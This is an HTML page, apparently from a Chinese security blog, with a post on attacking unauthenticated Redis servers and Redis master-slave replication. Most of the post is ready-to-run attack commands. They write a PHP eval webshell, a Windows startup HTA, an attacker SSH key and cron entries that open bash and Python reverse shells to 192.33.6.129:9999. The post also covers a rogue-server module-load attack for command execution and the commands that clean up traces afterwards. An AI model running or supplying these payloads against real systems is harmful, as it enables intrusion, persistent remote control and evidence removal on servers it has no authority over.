@@ -1,0 +1,361 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Redis主从复制 | 6right</title>
+
+<link rel="shortcut icon" href="https://6right.fun/favicon.ico?v=1656423790059">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://6right.fun/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1656423790059"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    Redis主从复制
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-02-24 ·
+                    </time>
+                    
+                        <a href="https://6right.fun/tag/lDbxOjemm/" class="post-tags">
+                            # Web安全基础
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="redis主从复制">Redis主从复制</h1>
+<h2 id="未授权访问">未授权访问</h2>
+<p>版本3.2之前都是绑定0.0.0.0:6379所以暴露在公网</p>
+<p>3.2之后绑定127.0.0.1相对安全，但是还是无密码可以利用ssrf进行利用(gopher，dict)</p>
+<h3 id="利用">利用</h3>
+<p>注意<code>flushall</code>危险操作，会清空所有缓存数据。</p>
+<h4 id="通用">通用</h4>
+<ul>
+<li>
+<p>写入webshell</p>
+<pre><code>flushall
+set x '&lt;?php eval($_GET[&quot;Q&quot;]);?&gt;'
+config set dir /var/www/html/upload
+config set dbfilename test.php
+save
+</code></pre>
+</li>
+</ul>
+<h4 id="windows">windows</h4>
+<ul>
+<li>
+<p>写入自启动文件</p>
+<pre><code># win10系统管理员自启动目录
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+# win7、win10等系统普通用户下自启动目录
+# user:Administrator
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+flushall
+
+set x '&lt;SCRIPT Language=&quot;JScript&quot;&gt;new ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;);&lt;/SCRIPT&gt;'
+
+config set dir 'C:\Users\root\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+
+config set dbfilename exp.hta
+
+save
+</code></pre>
+</li>
+</ul>
+<h4 id="linux">linux</h4>
+<ul>
+<li>写入SSH公钥免密登录</li>
+</ul>
+<pre><code>ssh-keygen -t rsa#生成恶意公钥
+#写入
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+set x &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose\n\n&quot;
+save
+</code></pre>
+<ul>
+<li>
+<p>写入定时任务反弹Shell</p>
+<pre><code># bash反弹
+config set dir /var/spool/cron/
+config set dbfilename root
+set x '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.33.6.129/9999 0&gt;&amp;1\n\n'
+save
+
+config set dir /var/spool/cron/
+config set dbfilename root
+set x '\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.33.6.129/9999 0&gt;&amp;1\n\n'
+save
+
+# python反弹
+config set dir /var/spool/cron/
+config set dbfilename root
+set x &quot;\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.33.6.129\&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'\n\n&quot;
+save
+</code></pre>
+</li>
+</ul>
+<h2 id="什么是主从复制"><strong>什么是主从复制</strong></h2>
+<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave),数据的复制是单向的，只能由主节点到从节点。</p>
+<p>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点</p>
+<p>简单来说，主从关系中的两大角色master(主) 和 slave(从) ，为了达到读写分离，规定在主服务器中写（同时同步到从数据库），在从服务器中读。算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<h2 id="为什么要用主从复制">为什么要用主从复制？</h2>
+<p>要实现分布式数据库的更大的存储容量和承受高并发访问量，将原来集中式数据库的数据分别存储到其他多个网络节点上。</p>
+<h2 id="简单实现">简单实现</h2>
+<pre><code> 主 192.168.159.129   安装redis-server和redis-cli并启动
+ 从 192.168.159.132   安装redis-server并启动
+</code></pre>
+<p>在主redis上执行</p>
+<pre><code>redis-cli -h 127.0.0.1 -p 6379
+127.0.0.1:6379&gt; slaveof no one
+OK
+127.0.0.1:6379&gt; set lyy 1
+OK
+127.0.0.1:6379&gt; get lyy
+&quot;1&quot;
+127.0.0.1:6379&gt; exit
+redis-cli -h 192.168.159.132
+192.168.159.132:6379&gt; slaveof 192.168.159.129 6379
+OK
+192.168.159.132:6379&gt; get lyy
+&quot;1&quot;
+</code></pre>
+<p>slaveof命令：设置主从关系，形式为slaveof ip port，其中slaveof no one表示不从属其他机器</p>
+<p>注意如果是新版本需要更改配置</p>
+<pre><code>protected-mode no
+</code></pre>
+<h2 id="getshell">getshell</h2>
+<p>主从复制getshell的原理就是在redis 4.x-5.x版本中，允许从外部加载.so文件并且将这个文件中代码变成redis功能的一部分，从而实现功能扩展。</p>
+<p>可以利用这个功能通过编译恶意的.so文件，并将该文件同步到从属redis上，进行加载，即可实现恶意代码的功能</p>
+<p>1.第一步通过未授权或者已知密码去连接服务端redis，建立和自己攻击机的从属关系</p>
+<p>我们刚刚在上一步已经实现</p>
+<p>2.恶意的so文件使用Dliv3师傅已经编译好的</p>
+<pre><code>https://github.com/Dliv3/redis-rogue-server
+</code></pre>
+<p>运行python脚本即可成功利用</p>
+<pre><code>python3 redis-rogue-server.py --rhost 192.168.159.132  --rport 6379 --lhost 192.168.159.129 --lport 6379
+</code></pre>
+<h3 id="原理">原理</h3>
+<ol>
+<li>
+<p>自己搭建redis数据库，然后受害者将自己的数据库设置为主节点。</p>
+<pre><code>slaveof x.x.x.x  xx
+</code></pre>
+</li>
+<li>
+<p>设置备份文件名为恶意so文件</p>
+<pre><code>set dir ./
+set dbfilename exp.sp
+</code></pre>
+</li>
+<li>
+<p>加载恶意so文件，实现任意命令执行</p>
+<pre><code>module load ./exp.so
+</code></pre>
+</li>
+<li>
+<p>执行命令</p>
+<pre><code>system.exec 'whoami'
+</code></pre>
+</li>
+<li>
+<p>清理痕迹</p>
+<pre><code>config set dbfilename dump.rdb#redis快照文件
+system.exec 'rm ./exp.so'
+module unload system
+</code></pre>
+</li>
+</ol>
+<h2 id="优势">优势</h2>
+<p>redis服务器中不包括除redis服务以外的任何服务时也可以利用，且更加便捷</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://6right.fun/post/zabbix-cve-2022-23131-fu-xian/" class="post-title gt-a-link">
+                    Zabbix-CVE-2022-23131复现
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/redis-zhu-cong-fu-zhi/" class="leancloud_visitors" data-flag-title="Redis主从复制">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://6right.fun/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
